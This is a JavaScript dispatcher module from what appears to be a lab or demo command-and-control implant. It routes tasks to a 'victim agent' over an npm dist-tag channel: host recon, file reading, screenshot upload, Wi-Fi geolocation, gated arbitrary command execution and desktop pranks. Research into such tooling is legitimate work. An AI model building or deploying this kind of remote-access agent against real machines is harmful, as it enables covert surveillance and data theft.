// Task dispatcher and allowlist registry. Handlers live in per-domain
// modules — sysinfo.js (host recon), files.js (filesystem), screenshot.js,
// geolocate.js, exec.js (opt-in arbitrary command), fun.js (desktop pranks).
// This module merges them into the TASKS map keyed by op name and enforces
// the opt-in gates (fun/screenshot/geolocate/exec) in runTask.
//
// This is a hard-coded allowlist on purpose: apart from the explicitly
// gated `exec` demo op, the victim agent can NEVER execute arbitrary shell
// commands — only these deterministic, read-mostly operations. Everything
// still travels as plain base64 over the dist-tag channel.
import { TASK_OPS } from '../common/protocol.js';
import { getOpDef } from '../common/ops.js';
import { runFunTask } from './fun.js';
import { SYSINFO_TASKS } from './sysinfo.js';
import { FILE_TASKS } from './files.js';
import { SCREENSHOT_TASKS } from './screenshot.js';
import { GEOLOCATE_TASKS } from './geolocate.js';
import { EXEC_TASKS } from './exec.js';

// Re-export the handler modules' public surface so existing imports from
// this module (tests, agent) keep working unchanged.
export {
  DEFAULT_MAX_FILE_BYTES,
  HASH_MAX_BYTES,
  LS_MAX_ENTRIES,
  FIND_MAX_RESULTS,
  FIND_MAX_DEPTH,
  positiveLimit,
  FILE_TASKS,
} from './files.js';
export { PS_MAX_LINES, SYSINFO_TASKS } from './sysinfo.js';
export {
  DEFAULT_SCREENSHOT_MAX_WIDTH,
  SCREENSHOT_MIN_WIDTH,
  SCREENSHOT_WIDTH_RANGE,
  normalizeUploadUrls,
  uploadFileAndExtractUrl,
  SCREENSHOT_TASKS,
} from './screenshot.js';
export {
  GEO_MAX_APS,
  GEO_MAX_SSID_LEN,
  GEO_HTTP_TIMEOUT_MS,
  GEO_USER_AGENT,
  GEO_DEFAULT_SERVICE_URL,
  parseAirportScan,
  parseSystemProfilerWifi,
  parseNmcliScan,
  parseNetshScan,
  scanWifiNetworks,
  lookupWpsLocation,
  GEOLOCATE_TASKS,
} from './geolocate.js';
export { EXEC_TASKS } from './exec.js';

const TASKS = {
  ...SYSINFO_TASKS,
  ...FILE_TASKS,
  ...SCREENSHOT_TASKS,
  ...GEOLOCATE_TASKS,
  ...EXEC_TASKS,

  openurl: (args, options) => runFunTask('openurl', args, options),
  say: (args, options) => runFunTask('say', args, options),
  notify: (args, options) => runFunTask('notify', args, options),
  beep: (args, options) => runFunTask('beep', args, options),
  bounce: (args, options) => runFunTask('bounce', args, options),
  volume: (args, options) => runFunTask('volume', args, options),
  rickroll: (args, options) => runFunTask('rickroll', args, options),
  party: (args, options) => runFunTask('party', args, options),
};

export const ALLOWED_OPS = Object.freeze([...TASK_OPS]);

/**
 * Dispatch a command to the mock task allowlist.
 * @param {string} op
 * @param {object} [args]
 * @param {object} [limits] e.g. { maxFileBytes, revealEnv }
 * @returns {{ok: true, output: string, file?: object} | {ok: false, error: string}}
 */
export function runTask(op, args = {}, limits = {}) {
  const fn = TASKS[op];
  if (!fn) {
    return {
      ok: false,
      error: `unknown or disallowed op "${op}" — allowlist: ${ALLOWED_OPS.join(', ')}`,
    };
  }
  if (getOpDef(op)?.group === 'fun' && limits.enableFunOps === false) {
    return { ok: false, error: `task "${op}" is disabled; set enableFunOps only on an attended lab host` };
  }
  if (getOpDef(op)?.group === 'screen' && limits.enableScreenshot !== true) {
    return { ok: false, error: `task "${op}" is disabled; set enableScreenshot only on an attended lab host` };
  }
  if (op === 'geolocate' && limits.enableGeolocate !== true) {
    return { ok: false, error: `task "${op}" is disabled; set enableGeolocate only on an attended lab host` };
  }
  if (op === 'exec' && limits.enableExec !== true) {
    return { ok: false, error: `task "${op}" is disallowed; set enableExec only on an attended lab host` };
  }
  try {
    const r = fn(args, limits);
    if (r && typeof r === 'object' && r.file) {
      return { ok: true, output: String(r.output ?? ''), file: r.file };
    }
    return { ok: true, output: String(r) };
  } catch (err) {
    return { ok: false, error: `task "${op}" failed: ${err.message}` };
  }
}
